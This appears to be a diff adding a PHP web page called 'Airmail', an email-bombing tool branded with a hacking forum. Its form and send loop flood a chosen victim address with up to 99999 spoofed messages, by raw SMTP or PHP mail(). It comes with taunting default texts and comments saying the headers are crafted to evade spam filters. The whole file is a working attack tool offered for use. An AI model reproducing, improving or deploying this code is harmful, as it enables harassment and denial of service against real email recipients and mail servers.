@@ -1,0 +1,247 @@
+<html>
+<head>
+<title>Airmail, By Sirholkms</title>
+<style type="text/css">
+A:link, A:visited, A:active {
+display: block; 
+color: #00FF00;
+text-decoration: none;
+}
+A:hover {
+display: block; 
+color: #FFFFFF;
+text-decoration: none;
+}
+body {
+scrollbar-face-color: #000000;
+scrollbar-highlight-color: #00FF00;
+scrollbar-shadow-color :#00FF00;
+scrollbar-3dlight-color: #000000;
+scrollbar-arrow-color: #000000;
+scrollbar-track-color: #000000;
+font-family: verdana;
+scrollbar-darkshadow-color: #000000;
+background-color: #000000;
+color: #FFFFFF;
+}
+table {
+font-weight: bold;
+}
+textarea {
+color: #FFFFFF;
+background-color: #000000;
+width: 100%;
+}
+table {
+width: 80%;
+}
+input {
+font-weight: bold;
+width: 100%;
+color: #00FF00;
+background-color: #000000;
+}
+.banner {
+font-family: "Lucida Console";
+font-size: 7;
+}
+legend {
+font-weight: bold;
+color: #FFFFFF;
+}
+</style>
+</head>
+<body>
+<?php
+
+###########################################################
+#  CCCCCC OOOOO DDDD  EEEEE DDDD    BBBBB   Y   Y         #
+#  C      O   O D   D E     D   D   B    B   Y Y   []     #
+#  C      O   O D   D EEEEE D   D   BBBBB     Y           #
+#  C      O   O D   D E     D   D   B    B   Y     []     #
+#  CCCCCC OOOOO DDDD  EEEEE DDDD    BBBBB   Y             #
+#                                                         #
+#    SSSS I RRRR  H  H OOOOO L     K  K MM   MM  SSSS     #
+#   S   S I R   R H  H O   O L     K K  M M M M  S   S    #
+#    S    I RRRR  HHHH O   O L     KK   M  M  M   S       #
+#  s  S   I R   R H  H O   O L     K K  M     M s  S      #
+#   SSSS  I R   R H  H OOOOO LLLLL K  K M     M  SSSS  {} #
+#                                                         #
+#                                                         #
+########################################################### 
+
+
+//Variables to get text from forms.
+$from = $_POST["mailfrom"];
+$replyto = $_POST["replyto"];
+$subject = $_POST["mailsubject"];
+$message = $_POST["mailmessage"];
+$to = $_POST["mailto"];
+$times = $_POST["mailtimes"];
+$headers = "From: $from\r\nReply-To: $replyto\r\nReturn-Path: $replyto\r\nMessage-ID: $messageid\r\nX-Mailer: PHP v:$xmailer\r\nSubject: $subject\r\n";
+
+
+$times_start_value = 0;
+
+$smtpserver = $_POST["mailsmtp"];
+$smtpserverport = $_POST["mailsmtpport"];
+$smtpserverusername = $_POST["mailsmtpusername"];
+$smtpserverpassword = $_POST["mailsmtppassword"];
+
+$smtpmode = $_POST["smtpmode"];
+
+
+
+//Default Values loaded by the forms.
+$fromvalue = "fuck_you@owned.com";
+$replytovalue = "fuck_you@owned.com";
+$subjectvalue = "Lol y u get bombed?";
+$messagevalue = "To use remote SMTP servers set SMTP mode to on.
+To use the mail() function instead, set SMTP mode to off.
+It does require this server to have an SMTP server installed though.";
+$tovalue = "victim@fucking_haxed.com";
+$timesvalue = 99999;
+$smtpservervalue = "localhost";
+$smtpserverportvalue = "25";
+$smtpserverusernamevalue = ""; //Set to null unless server requires authentication.
+$smtpserverpasswordvalue = ""; //Set to null unless server requires authentication.
+$smtpmodevalue = "on";
+#------------------------------------^
+#Set to off if you want to use the mail() function instead.
+#Although it requires the server this is running on to have an SMTP server.
+
+$messageid = "time()"."-"."$from"; //Avoid spam filters.
+$xmailer = "phpversion()"; //Avoid spam filters.
+
+
+print ("
+<center>
+<div class=\"banner\">
+<a href=\"http://www.evilzone.org\" target=\"_blank\">
+EEEEEEEEE&nbsp;&nbsp;VV&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VV&nbsp;&nbsp;II&nbsp;&nbsp;LL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OOOOOOOO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NN&nbsp;&nbsp;EEEEEEEEE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OOOOOOOO&nbsp;&nbsp;&nbsp;RRRRRRRR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GGGGGGGG&nbsp;<br>
+EEEEEEEEE&nbsp;&nbsp;&nbsp;VV&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VV&nbsp;&nbsp;&nbsp;II&nbsp;&nbsp;LL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ZZZZZZZZZZZ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OOOOOOOOOO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NNNN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NN&nbsp;&nbsp;EEEEEEEEE&nbsp;&nbsp;&nbsp;&nbsp;OOOOOOOOOO&nbsp;&nbsp;RRRRRRRRR&nbsp;&nbsp;&nbsp;GGGGGGGGGG<br>
+EE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VV&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VV&nbsp;&nbsp;&nbsp;&nbsp;II&nbsp;&nbsp;LL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ZZ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NN&nbsp;NN&nbsp;&nbsp;&nbsp;&nbsp;NN&nbsp;&nbsp;&nbsp;EE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OO&nbsp;&nbsp;RR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RR&nbsp;&nbsp;&nbsp;GG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GG<br>
+EEEEEEEEE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VV&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VV&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;II&nbsp;&nbsp;LL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ZZ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NN&nbsp;&nbsp;NN&nbsp;&nbsp;&nbsp;NN&nbsp;&nbsp;&nbsp;&nbsp;EEEEEEEEE&nbsp;&nbsp;&nbsp;&nbsp;OO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OO&nbsp;&nbsp;RR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RR&nbsp;&nbsp;&nbsp;&nbsp;GGGGGGGGG<br>
+EEEEEEEEE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VV&nbsp;&nbsp;&nbsp;&nbsp;VV&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;II&nbsp;&nbsp;LL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ZZ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NN&nbsp;&nbsp;&nbsp;NN&nbsp;&nbsp;NN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EEEEEEEEE&nbsp;&nbsp;&nbsp;&nbsp;OO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OO&nbsp;&nbsp;RR&nbsp;&nbsp;&nbsp;&nbsp;RR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GG<br>
+EE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VV&nbsp;&nbsp;VV&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;II&nbsp;&nbsp;LL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ZZ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OO&nbsp;&nbsp;&nbsp;&nbsp;NN&nbsp;&nbsp;&nbsp;&nbsp;NN&nbsp;NN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OO&nbsp;&nbsp;RRRRRRR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GG<br>
+EEEEEEEEE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VVVV&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;II&nbsp;&nbsp;LLLLLLLLLL&nbsp;&nbsp;&nbsp;ZZ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OOOOOOOOOO&nbsp;&nbsp;&nbsp;NN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NNNN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OOOOOOOOOO&nbsp;&nbsp;RR&nbsp;&nbsp;&nbsp;&nbsp;RR&nbsp;&nbsp;&nbsp;&nbsp;GGGGGGGGGG<br>
+EEEEEEEEE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VV&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;II&nbsp;&nbsp;LLLLLLLLLL&nbsp;&nbsp;&nbsp;ZZZZZZZZZZ&nbsp;&nbsp;&nbsp;OOOOOOOO&nbsp;&nbsp;&nbsp;NN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EEEEEEEEE&nbsp;[]&nbsp;&nbsp;OOOOOOOO&nbsp;&nbsp;&nbsp;RR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RR&nbsp;&nbsp;&nbsp;GGGGGGGGGG<br>
+Coded&nbsp;By:&nbsp;Sirholkms
+</a>
+</div>
+
+
+<form action=\"$PHPSELF\" method=\"post\">
+<table border=\"0\">
+
+<tr>
+<th colspan=\"2\">SMTP Config</th>
+<th colspan=\"2\">Sending Config</th>
+</tr>
+
+<tr>
+<td>SMTP Server:</td>
+<td><input type=\"text\" name=\"mailsmtp\" value=\"$smtpservervalue\"></td>
+<td>From:</td>
+<td><input type=\"text\" name=\"mailfrom\" value=\"$fromvalue\"></td>
+</tr>
+
+<tr>
+<td>SMTP Server Port:</td>
+<td><input type=\"text\" name=\"mailsmtpport\" value=\"25\"></td>
+<td>Reply To:</td>
+<td><input type=\"text\" name=\"mailreplyto\" value=\"$fromvalue\"></td>
+</tr>
+
+<tr>
+<td>SMTP Username:</td>
+<td><input type=\"text\" name=\"mailsmtpusername\" value=\"\"></td>
+<td>Subject:</td>
+<td><input type=\"text\" name=\"mailsubject\" value=\"$subjectvalue\"></td>
+</tr>
+
+<tr>
+<td>SMTP Password:</td>
+<td><input type=\"text\" name=\"mailsmtppassword\" value=\"\"></td>
+<td>To:</td>
+<td><input type=\"text\" name=\"mailto\" value=\"$tovalue\"></td>
+</tr>
+
+<tr>
+<td>SMTP Mode:</td>
+<td><input type=\"text\" name=\"smtpmode\" value=\"$smtpmodevalue\"></td>
+<td>Times to send:</td>
+<td><input type=\"text\" name=\"mailtimes\" value=\"$timesvalue\"></td>
+</tr>
+
+<tr>
+<td colspan=\"6\">
+<fieldset><legend>Message:</legend>
+<textarea name=\"mailmessage\" rows=\"5\">$messagevalue</textarea>
+<p>
+<input type=\"submit\" value=\"Bomb\">
+</fieldset>
+</td>
+</tr>
+
+</table>
+</form>
+</center>
+
+");
+
+
+
+
+
+
+
+while($times_start_value < $times) {
+
+if($smtpmode == "on"){
+// SMTP connection
+
+$handle = fsockopen($smtpserver,$smtpserverport);
+
+if(isset($smtpserverusername)){
+// SMTP authorization
+fputs($handle, "user base64_encode($smtpserverusername)"."\r\n");
+fputs($handle, "pass base64_encode($smtpserverpassword)"."\r\n");
+}
+
+
+
+// Send out the e-mail
+fputs($handle, "MAIL FROM:<$from>\r\n");
+fputs($handle, "RCPT TO:<$to>\r\n");
+fputs($handle, "DATA\r\n");
+fputs($handle, "To: $to\r\n");
+fputs($handle, "Reply-To: $replyto\r\n"); //Set reply address.
+fputs($handle, "Return-Path: $replyto\r\n"); //Set reply address.
+fputs($handle, "Message-ID: $messageid\r\n"); //Avaid spam filters.
+fputs($handle, "X-Mailer: PHP v:$xmailer\r\n"); //Avaid spam filters.
+fputs($handle, "Subject: $subject\r\n"); //Avaid spam filters.
+fputs($handle, "$message\r\n");
+fputs($handle, ".\r\n");
+
+
+
+
+
+
+// Close connection to SMTP server
+fputs($handle, "QUIT\r\n");
+
+$times_start_value++;
+echo "<center>"."Sent $to $times_start_value emails.<br>"."</center>";
+} elseif ($smtpmode == "off"){
+mail("$to", "$subject", "$message", "$headers");
+$times_start_value++;
+echo "<center>"."Sent $to $times_start_value emails.<br>"."</center>";
+} else {
+print ("Error: can't connect to SMTP/local SMTP server or you didn't set on or off for SMTP mode.");
+}
+}
+?>
+</body>
+</html>
